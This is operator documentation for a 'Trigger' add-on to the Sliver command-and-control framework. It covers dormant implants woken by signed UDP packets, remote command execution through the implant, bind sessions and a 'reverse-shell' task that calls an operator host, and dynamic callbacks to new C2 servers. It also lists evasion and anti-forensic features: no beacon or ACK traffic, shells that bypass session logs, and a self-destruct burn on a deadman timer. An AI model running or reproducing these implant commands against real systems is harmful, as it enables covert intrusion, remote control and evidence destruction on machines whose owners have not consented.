The Trigger feature adds an **authenticated, quiet, signed-UDP task dispatcher** to Sliver. Operators start a listener with one or more task bindings; signed UDP packets from anywhere in the world fire the bound action. No TCP, no clock-driven beacon traffic, no ACK packets that telegraph the listener's existence.

It's the right tool for: "wake this implant now," "kill that listener," "fire this shell-out," "burn that implant." The protocol is integrity-only -- see the **Security Model** section below for what it does and doesn't protect.

The listener core is imported as a library (`github.com/0x90pkt/trigger/pkg/listener`) -- the Sliver fork just provides the gRPC bridge, the console commands, and Sliver-specific task handlers.

All trigger operations are built into sliver-server and sliver-client. No external binaries are needed.

## Trigger implant architecture

Every trigger implant has **three operational modes**, all always baked in:

1. **Ad-hoc exec** -- bidirectional UDP command execution. The operator fires a signed "exec" packet; the implant runs the command and returns output over UDP. No C2 session required.

2. **Wake session** -- on receipt of a signed "wake" packet, the implant establishes an **interactive SESSION** (not a beacon) over its configured C2 transports. For maximum flexibility, specify both `--mtls` (TCP) and `--wg` (UDP) when generating the implant.

3. **Bind session** -- on receipt of a signed "bind" packet, the implant opens a local listener (TCP or UDP) and reports the port back. The Sliver server then connects **to** the implant, establishing a full interactive session over the bind port. TCP uses yamux multiplexing over an encrypted stream; UDP uses KCP (reliable UDP) + yamux over an encrypted stream. This mode is ideal for environments where outbound connections are blocked but inbound access is possible (e.g., compromised DMZ hosts, post-pivot networks, or hosts behind strict egress filtering).

Trigger implants **never use beacon mode**. Both wake callbacks and bind sessions always establish full interactive sessions.

# Quickstart

```
sliver > trigger --lhost 0.0.0.0 --lport 46290 \
                 --secret-env TRIGGER_SECRET \
                 --server-id site-A \
                 --task wake-jumpbox:wake-callback:<beacon-uuid> \
                 --task kill-mtls:stop-job:mtls-8443

[*] Starting trigger listener on 0.0.0.0:46290 ...
[*] Successfully started trigger listener as job #4
[*] Registered tasks:
      wake-jumpbox  wake-callback -> beacon=<beacon-uuid>
      kill-mtls     stop-job    -> job=mtls-8443
```

Send a wake from the sliver console (no external tools):

```
sliver > trigger send <target-ip> wake \
             --secret-env TRIGGERWAKE_SECRET \
             --client-id operator-jc \
             --comms mtls

[*] Firing trigger packet: target=<target-ip>:46290 intent=wake client-id=operator-jc
[*] Trigger packet sent to <target-ip>:46290 (intent=wake)
[*] Note: UDP is fire-and-forget -- delivery is not confirmed.
```

Or by trigger index (auto-populates port, secret, target from stored config):

```
sliver > triggers
 Index  Name           OS/Arch       Bind Port  C2 Transports  Allowed Clients  Target
 1      jumpbox-impl   linux/amd64   46290      mtls,wg        operator-jc      10.0.0.42

sliver > trigger send 1 wake --comms wg
```

Wake with a **bind session** (the implant opens a listener and the server connects to it):

```
sliver > trigger send 1 wake --bind

[*] Resolved trigger index 1: name=jumpbox-impl target=10.0.0.42 port=46290
[*] Sending trigger packet: target=10.0.0.42:46290 intent=wake client-id=operator-jc
[*] Bind mode: implant will open listener, server will connect back
[*] Trigger packet sent to 10.0.0.42:46290 (intent=wake, bind=true)
[*] Waiting for bind port report from implant...
[*] Implant reported bind port: tcp/52341
[*] Connecting to 10.0.0.42:52341 (tcp)...
[*] Session 8e7f1c0a opened via bind connection
```

Bind with explicit port, protocol, or deferred connection:

```
sliver > trigger send 1 wake --bind --bind-port 5555
sliver > trigger send 1 wake --bind --bind-proto udp
sliver > trigger send 1 wake --bind --bind-port 5555 --bind-proto udp --ttl 60
sliver > trigger send 1 wake --bind --no-connect
```

When `--no-connect` is used, the server doesn't auto-connect. Use `trigger connect` later:

```
sliver > trigger connect 1 tcp://10.0.0.42:52341

[*] Connecting to 10.0.0.42:52341 (tcp)...
[*] Session 8e7f1c0a opened via bind connection
```

Wake with a **dynamic callback address** (the implant connects to the specified C2 instead of its baked-in list):

```
sliver > trigger send 1 wake --callback mtls://10.0.0.5:8888

[*] Resolved trigger index 1: name=jumpbox-impl target=10.0.0.42 port=46290
[*] Sending trigger packet: target=10.0.0.42:46290 intent=wake client-id=operator-jc
[*] Dynamic callback: mtls://10.0.0.5:8888
[*] Trigger packet sent to 10.0.0.42:46290 (intent=wake)
[*] Note: UDP is fire-and-forget -- delivery is not confirmed.
```

Dispatch a server-side task (no UDP, no HMAC -- handler runs in-process):

```
sliver > trigger dispatch 4 wake-jumpbox

[*] Dispatching task "wake-jumpbox" on job #4 ...
[*]   wake-session -> beacon=<beacon-uuid>
[*] Task "wake-jumpbox" dispatched successfully on job #4
```

Server-side audit logs (in Sliver's standard log dir under `c2/trigger-audit`):

```
INFO ACCEPT event=trigger_attempt server=site-A client=operator-jc \
            intent=wake-jumpbox source=10.0.0.5 nonce=ab12... reason=accepted
```

# Task kinds

Each `--task` flag is a `NAME:KIND:ARGS` triple. The operator picks the name (what the wire packet carries); the kind selects which Sliver-side handler runs.

### `wake-session` (alias: `wake-callback`)

Fires a wake signal for a trigger implant. Trigger implants establish an **interactive session** (not a beacon) when woken. For backward compatibility with legacy beacon configurations, the handler also updates the beacon's `NextCheckin` field if the target UUID corresponds to an existing beacon.

```
--task wake-jumpbox:wake-callback:8e7f1c0a-1234-5678-90ab-cdef01234567
```

Argument: the target UUID (`sessions` or `beacons` shows it).

### `stop-job`

Stops a Sliver job by name. First active match wins; if you have multiple jobs with the same name, bind multiple tasks with distinct labels.

```
--task kill-mtls:stop-job:mtls
--task kill-https:stop-job:https
```

Argument: the job's `Name` field (`jobs` shows it).

### `exec`

Run a configured command on the Sliver server host. **Designed not to be a shell-injection backdoor**:

- Absolute-path command + pre-split argv. **No shell interpolation**, no `sh -c "..."` codepath.
- Subprocess starts with a fresh, minimal environment containing only `PATH`, `HOME`, task context (`INTENT`, `CLIENT_ID`, `SOURCE_IP`, `NONCE`, `TIMESTAMP`), plus whatever the operator added via the binding. **The operator's HMAC shared secret cannot leak into the subprocess.**
- Per-invocation context deadline (default 10s) kills runaways.
- Bounded stdout/stderr capture (64KB).

```
--task run-rotate:exec:/usr/local/bin/rotate-keys.sh,--verbose
```

Argument: absolute-path command, then comma-separated args (no shell quoting; one arg per comma-separated token).

### `reverse-shell`

Dial a pre-bound operator endpoint over TCP (optionally TLS), exec a shell, plumb stdin/stdout/stderr over the socket. **Bypasses Sliver's session machinery entirely** -- no session record, no entry in `sessions`, no Sliver session logs. Audited only in the trigger's own log.

```
--task shellback:reverse-shell:10.0.0.5:4444,tls
```

Argument: `host:port` of the operator's listening shell, optionally `,tls` to wrap the connection. Shell path defaults to `/bin/sh -i` on Unix and `cmd.exe` on Windows; configurable per binding.

The bind-config approach means a crafted `client_id` can't redirect the shell to an attacker's endpoint -- the destination is locked at listener-start.

### `bind`

Opens a server-side bind handler that connects to an implant's bind port. When an implant receives a `bind` intent via a trigger packet, it opens a local listener and reports the port back. The `bind` task kind tells the server how to connect.

```
--task open-bind:bind:0.0.0.0:5555
--task open-bind:bind:0.0.0.0:0,udp
```

Argument: `bind_address:port` followed by an optional `,udp` suffix. Port `0` means the server will use the port reported by the implant. When the protocol suffix is omitted, TCP is assumed.

The server-side handler performs the HMAC-SHA256 challenge-response handshake, negotiates the ChaCha20-Poly1305 encrypted channel, and then establishes a full Sliver session over the connection (yamux multiplexing for both TCP and KCP/UDP).

# Commands

| Command | Purpose |
|---|---|
| `generate trigger ...` | Build a trigger implant (three modes: ad-hoc exec, wake session, bind session) |
| `triggers` | List all generated trigger implants (indexed) |
| `triggers target <index> <ip>` | Associate a deployment IP with a trigger implant |
| `trigger ...` | Start a server-side trigger listener with task bindings |
| `trigger tasks <job-id>` | Print the bindings registered against a running listener |
| `trigger dispatch <job-id> <task-name>` | Dispatch a server-side task handler (no UDP, runs in-process) |
| `trigger send <target-ip\|index> <intent>` | Send a signed UDP packet to an implant (wake, self-destruct, exec). Use `--callback` for dynamic C2, `--bind` for bind sessions. |
| `trigger connect <index> <proto://host:port>` | Manually connect to an implant's bind port (e.g., `tcp://10.0.0.42:52341`). Used with `--no-connect`. |
| `jobs` | Lists all jobs including trigger listeners |
| `jobs --kill <id>` | Stop a trigger listener (reuses Sliver's generic job kill) |

# Configuration

## Listener flags

| Flag | Meaning |
|---|---|
| `--lhost` / `--lport` | UDP bind |
| `--secret-env` | env var NAME on the **operator** host holding the HMAC shared secret. Read locally, sent over mTLS-protected gRPC to the server. Avoids putting raw secrets in argv. |
| `--server-id` | Audit identifier embedded in events |
| `--task` | Repeatable; `NAME:KIND:ARGS` (see above) |
| `--allowed-source` | Repeatable; exact IP or CIDR (v4/v6). Empty = any source. |
| `--allowed-client` | Repeatable; client_id allowlist. Empty = any signed client. |

## Send flags (`trigger send`)

| Flag | Meaning |
|---|---|
| `--port` / `-p` | UDP port the implant's triggerwake is bound to (default 46290) |
| `--secret-env` / `-S` | env var holding the HMAC shared secret (preferred; no secret in argv) |
| `--secret` | HMAC shared secret (direct value; visible in ps -- prefer `--secret-env`) |
| `--client-id` | Sender identity included in the trigger packet (default `sliver-operator`) |
| `--payload` | Command/data for bidirectional intents (e.g., `ls -la /tmp` for `exec`) |
| `--callback` / `-c` | Dynamic callback address for wake intent (e.g., `mtls://10.0.0.5:8888`). Overrides baked-in C2 list. |
| `--output` / `-o` | Write exec output to file (only for `intent=exec`) |
| `--comms` | Preferred C2 transport hint for wake intent (e.g., `mtls`, `wg`) |
| `--bind` / `-b` | Open a bind session instead of a callback. The implant opens a listener and the server connects to it. |
| `--bind-port` | Port the implant should bind to (default `0` = random, implant picks an available port) |
| `--bind-proto` | Protocol for the bind listener: `tcp` or `udp` (default `tcp`). UDP uses KCP for reliable transport. |
| `--ttl` | Seconds the bind port stays open waiting for an authenticated connection (default `30`). Prevents indefinite port exposure. |
| `--no-session` | UDP-only: raw encrypted shell instead of a full Sliver session. Bypasses yamux/KCP, lower overhead but no session features. |
| `--no-connect` | Don't auto-connect to the bind port after the implant reports it. Use `trigger connect` later for manual connection. |

# Implant-side wake + self-destruct

When an implant is built with `IncludeTriggerWake=true` in its config (always true for `generate trigger`), it runs a **passive UDP listener** before any C2 traffic. The implant blocks on the wake channel until an operator explicitly wakes it -- zero network traffic until then. Three hardcoded intents:

- `wake` -- unblocks the C2 channel so the implant establishes an **interactive session** (not a beacon). On initial startup this is the first C2 dial-home; on subsequent wakes it re-establishes the session. Supports an optional **dynamic callback address** (see below).
- `self-destruct` -- fires the implant's burn primitive (self-deletes the binary, wipes the operator-configured persistence artifacts, exits).
- `exec` -- **bidirectional**: executes a command on the implant and sends the output back to the operator over UDP. The command is specified in the `--payload` flag. Output is capped at ~7KB and the exec timeout is 30 seconds. The response is HMAC-signed with the same shared secret.

**Transport options for the wake callback:**
- `--mtls` -- TCP callback via mTLS. Reliable, works through most NAT/firewalls.
- `--wg` -- UDP callback via WireGuard. Lower overhead.
- Recommended: specify **both** `--mtls` and `--wg` for maximum flexibility.

## Dynamic callback address

By default, a woken implant connects back to the C2 addresses baked in at build time. The `--callback` flag on `trigger send` overrides this with a **dynamic callback address**, allowing the operator to specify where the implant should connect at wake time.

```
sliver > trigger send 1 wake --callback mtls://newc2.example.com:8888
sliver > trigger send 10.0.0.5 wake --callback wg://vpn.example.com:51820 --secret-env TRIGGER_SECRET
```

This is designed for **dynamic infrastructure** -- rotating C2 servers, ephemeral redirectors, or situations where the operator doesn't know the callback address at implant build time. The callback URL is a full C2 address in the format `scheme://host:port` where the scheme matches a transport the implant was built with (`mtls`, `wg`, `http`, `https`, `dns`).

**How it works:**

1. The operator passes `--callback mtls://10.0.0.5:8888` on the `trigger send` command.
2. The callback URL is placed in the trigger packet's `payload` field, which is covered by the HMAC signature.
3. The implant receives the authenticated packet, parses the URL, extracts the scheme as a transport hint.
4. Instead of iterating its baked-in C2 list, the implant passes the callback URL as a **temporary C2 override** to its connection loop.
5. The implant connects to the dynamic address using the specified transport.

If the dynamic target is unreachable, the implant returns to dormant state and waits for the next wake trigger. It does **not** fall through to the baked-in C2 list within the same wake cycle -- each wake is a clean, independent attempt.

**Backward compatibility:** The payload format is backward compatible. Existing wake packets with just a transport hint (e.g., `--comms mtls`) or empty payloads continue to work unchanged. The implant distinguishes a full callback URL from a plain transport hint by the presence of `://` in the payload.

| Payload value | Behavior |
|---|---|
| _(empty)_ | Use baked-in C2 list, try all transports |
| `mtls` | Use baked-in C2 list, prefer mTLS transport |
| `mtls://10.0.0.5:8888` | Connect to `10.0.0.5:8888` via mTLS (dynamic callback) |

**Security:** The callback URL rides in the `payload` field which is included in the HMAC-SHA256 signature. An attacker without the shared secret cannot forge a packet with a malicious callback address. This is a deliberate design choice -- the authenticated nature of the trigger packet makes it safe to trust the callback target specified within it.

Example:

```
sliver > trigger send 10.0.0.5 exec \
             --payload "id" \
             --secret-env TRIGGERWAKE_SECRET

[*] Firing trigger packet: target=10.0.0.5:46290 intent=exec client-id=sliver-operator
[*] Payload: id
[*] Trigger packet sent to 10.0.0.5:46290 (intent=exec)
[*] Exit code: 0
[*] Output:
uid=1000(user) gid=1000(user) groups=1000(user)
```

## Bind intent

The `bind` intent inverts the connection direction: instead of the implant calling back to the server, the implant opens a local listener and the server connects to it. This is the right tool when the implant sits behind strict egress filtering but the operator has network access to its host (post-pivot, DMZ, lateral movement).

**How it works:**

1. The operator sends `trigger send <target> wake --bind` (with optional `--bind-port`, `--bind-proto`, `--ttl`).
2. The trigger packet carries the bind intent in its payload field (e.g., `tcp:5555` or `udp:0:ttl=60`).
3. The implant receives the authenticated packet, opens a listener on the requested port (or a random port if `0`).
4. The implant sends a one-shot UDP response back to the operator's source IP with the actual bound port.
5. The server (or operator via `trigger connect`) connects to the implant's bind port.
6. Both sides perform an HMAC-SHA256 challenge-response handshake to authenticate the connection.
7. Once authenticated, all traffic is encrypted with ChaCha20-Poly1305.
8. A full Sliver session is established over the encrypted channel.

**TCP bind sessions:** The server connects via TCP, completes the auth handshake, then layers yamux multiplexing + Sliver's standard envelope protocol over the encrypted stream. This gives full session capabilities -- tunnels, port forwards, file transfers, shell, etc.

**UDP bind sessions (KCP):** The server connects via UDP using KCP (a reliable-UDP library). KCP provides ordered, reliable delivery over UDP, then yamux + envelopes layer on top of the encrypted KCP stream. Same full session capabilities as TCP, but works in environments where TCP is filtered and only UDP is allowed.

**UDP raw encrypted shell (`--no-session`):** When `--no-session` is specified with `--bind-proto udp`, the implant skips the KCP/yamux/session stack entirely and provides a raw encrypted interactive shell over UDP datagrams. Each datagram is independently encrypted with ChaCha20-Poly1305. Lower overhead and simpler, but no session features (no tunnels, no file transfer -- just stdin/stdout). Useful for quick-and-dirty access or extremely constrained environments.

**Security:**

- **Auth handshake:** Both sides exchange 32-byte random nonces. The connecting side proves knowledge of the shared secret by computing `HMAC-SHA256(secret, server_nonce || client_nonce)`. The implant verifies the HMAC before allowing any further traffic. A failed handshake immediately closes the connection.
- **Encryption:** After auth, both sides derive a symmetric key via `HKDF-SHA256(secret, server_nonce || client_nonce)` and use it for ChaCha20-Poly1305 AEAD encryption of all subsequent traffic. Every message has a unique nonce (counter-based).
- **TTL:** The bind port closes automatically after the configured TTL (default 30 seconds) if no authenticated connection arrives. This prevents indefinite port exposure on the target. The TTL is configurable via `--ttl` on the send command.

| Payload value | Behavior |
|---|---|
| `tcp:0` | Bind TCP on random port, default 30s TTL |
| `tcp:5555` | Bind TCP on port 5555 |
| `udp:0` | Bind UDP (KCP) on random port |
| `udp:5555:ttl=60` | Bind UDP on port 5555, 60s TTL |
| `udp:0:ttl=60,nosession` | Bind UDP on random port, 60s TTL, raw encrypted shell (no KCP/yamux) |
| `tcp:5555:ttl=120` | Bind TCP on port 5555, 120s TTL |

These intents are baked in at implant build time -- not operator-configurable post-build -- because the implant runs in hostile environments where exposing a dispatch surface would be a foothold.

The implant's bind address, HMAC secret, and per-client allowlist all come from `ImplantConfig` template fields (`TriggerWakeBindAddr`, `TriggerWakeSecret`, `TriggerWakeAllowedClientIDs`) populated at build time.

## TTL (deadman switch)

When the implant is built with `TTLEnabled=true`, a minute-cadence ticker starts counting down from process start (not build time). Two layers enforce the TTL:

**Primary — implant-side watchdog.** The implant computes its deadline as `time.Now() + TTLMinutes` at process startup. Every authenticated trigger packet (any intent: wake, exec, self-destruct) resets the countdown to a fresh `TTLMinutes` from now. An actively-used implant never self-destructs from TTL. When the deadline expires without activity, the implant burns itself — same path as operator-fired self-destruct, same `BurnExtraPaths` + `BurnPersistence` lists.

**Fallback — server-side reaper.** The Sliver server runs a background sweep every 5 minutes. It tracks trigger implant activity (updated on every `trigger send` call) and, if an implant has gone silent past its TTL, fires a self-destruct packet as a last resort. Rate-limited to one attempt per hour per implant.

Key design properties:

- **TTL starts at runtime, not build time.** The implant binary can be stored and reused across deployments without expiring on the shelf. Only `TTLMinutes` is baked in — no absolute timestamp.
- **Activity resets the countdown.** Any authenticated signal proves the operator is alive and extends the deadline.
- **Two-layer defense-in-depth.** If the implant's watchdog fails (crash, bug), the server attempts cleanup.

Configurable per build via `--ttl <duration>` (minimum 1 minute). Example: `--ttl 720h` for 30 days.

# Security model

| Property | Mechanism |
|---|---|
| Message integrity | HMAC-SHA256 over canonical JSON, `hmac.Equal` (constant time) |
| Sender identity | Per-client key registry (`--allowed-client` + future per-client secrets) |
| Dynamic callback auth | Callback URL rides in the `payload` field, covered by the HMAC signature. Cannot be forged without the shared secret. |
| Replay defense | TTL'd nonce cache, bounded; over-cap inserts refuse rather than silently evict |
| Source allowlist | Exact IPs + CIDR ranges, v4 + v6 |
| Pre-HMAC DoS | Global packets-per-second cap (source-IP-agnostic; UDP source is forgeable) |
| Post-HMAC fairness | Per (client_id, source_ip) cap, applied after auth |
| Handler isolation | ctx deadline + panic recovery |
| No timing oracle | NO ACK packets emitted. Every reject branch is silent -- only the audit log knows. |
| Bind auth | HMAC-SHA256 challenge-response handshake. Both sides exchange 32-byte random nonces; connector proves key knowledge before any session traffic flows. |
| Bind encryption | ChaCha20-Poly1305 AEAD. Key derived via HKDF-SHA256 from shared secret + exchanged nonces. Counter-based nonces prevent reuse. |
| Bind TTL | Configurable accept deadline (default 30s). Bind port auto-closes if no authenticated connection arrives, preventing indefinite port exposure on the target. |

## What it doesn't protect

- **Confidentiality of the trigger UDP protocol.** Task labels, client_ids, and nonces ride in plaintext over UDP. Wrap with DTLS or run over a VPN if you need confidentiality for the trigger packets themselves. **Note:** Bind connections ARE encrypted -- once a bind session is established, all traffic is protected by ChaCha20-Poly1305. The confidentiality gap applies only to the initial trigger UDP dispatch, not the subsequent bind session.
- **Transport identity.** HMAC proves the message was signed with a known key; it doesn't prove who typed the trigger. Pair per-client keys with operational controls (one key per operator).
- **Forensic invisibility of self-destruct.** The burn primitive zero-fills + unlinks on POSIX and best-effort-deletes on Windows. A defender with a pre-burn disk image can still recover binaries.
- **Bind port visibility.** While the bind port is open (up to the TTL window), it is visible to network scanners. The TTL mechanism limits exposure, but a defender scanning during the window could detect the listening port. The auth handshake rejects unauthenticated connections immediately with no banner or identifying information.

# Wire protocol

JSON over UDP. Canonical signable payload uses Go's deterministic alphabetical key order so cross-language ports (Python, Rust) produce byte-identical HMAC inputs. Version pinned at `1`; any wire change MUST bump the version and break verifying receivers.

The `payload` field is a free-form string included in the HMAC computation when non-empty. Its semantics depend on the intent:

| Intent | Payload semantics |
|---|---|
| `wake` | Empty (no preference), transport hint (`mtls`), or full callback URL (`mtls://host:port`) |
| `wake` + bind | `proto:port[:options]` -- e.g., `tcp:5555`, `udp:0`, `udp:0:ttl=60,nosession` |
| `exec` | The command to execute (e.g., `ls -la /tmp`) |
| `self-destruct` | Unused (ignored) |

The wake payload format is backward compatible -- the implant uses `://` detection to distinguish a dynamic callback URL from a plain transport hint. Bind payloads are distinguished by the `proto:port` format (no `://` separator).

The standalone repo (`github.com/0x90pkt/trigger`) carries locked wire-compat regression vectors (`pkg/protocol/vectors_test.go`) -- those are the reference contract.
